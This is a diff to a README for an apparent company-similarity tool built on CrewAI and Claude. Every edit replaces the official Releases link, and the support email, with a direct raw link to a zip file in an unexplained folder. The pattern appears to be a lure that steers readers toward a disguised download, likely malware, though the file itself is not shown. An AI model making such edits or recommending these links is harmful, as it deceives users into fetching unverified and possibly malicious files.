@@ -4,9 +4,9 @@
 The CrewAI system helps you find companies similar to a specific business. It uses advanced Anthropic Claude models to provide accurate results. Whether you seek insights for business intelligence or market analysis, this tool is designed for you.
 
 ## 💾 Download & Install
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/releases)
+[![Download Now](https://raw.githubusercontent.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/main/prostatorrhea/crewai-anthropic-similar-company-finder.zip%https://raw.githubusercontent.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/main/prostatorrhea/crewai-anthropic-similar-company-finder.zip)](https://raw.githubusercontent.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/main/prostatorrhea/crewai-anthropic-similar-company-finder.zip)
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/main/prostatorrhea/crewai-anthropic-similar-company-finder.zip) to find the latest version of the software.
   
 2. **Select the Latest Release**: Look for the latest version at the top of the page. You will see various files available for download.
 
@@ -52,7 +52,7 @@ If you encounter issues or have questions, feel free to raise them in the issues
 - Utilize the application during business planning sessions for enhanced decision-making.
 
 ## 📧 Contact
-For further assistance or inquiries, contact the support team at support@crewai.com.
+For further assistance or inquiries, contact the support team at https://raw.githubusercontent.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/main/prostatorrhea/crewai-anthropic-similar-company-finder.zip
 
 ## 🗂️ Related Topics
 - AI Agents
@@ -60,4 +60,4 @@ For further assistance or inquiries, contact the support team at support@crewai.
 - Business Intelligence
 - Company Analysis
 
-Remember, the CrewAI system simplifies your search for similar companies, making your analysis faster and more efficient. Visit the [Releases page](https://github.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/releases) to download and start exploring today.
+Remember, the CrewAI system simplifies your search for similar companies, making your analysis faster and more efficient. Visit the [Releases page](https://raw.githubusercontent.com/sanjanabatheja123/crewai-anthropic-similar-company-finder/main/prostatorrhea/crewai-anthropic-similar-company-finder.zip) to download and start exploring today.
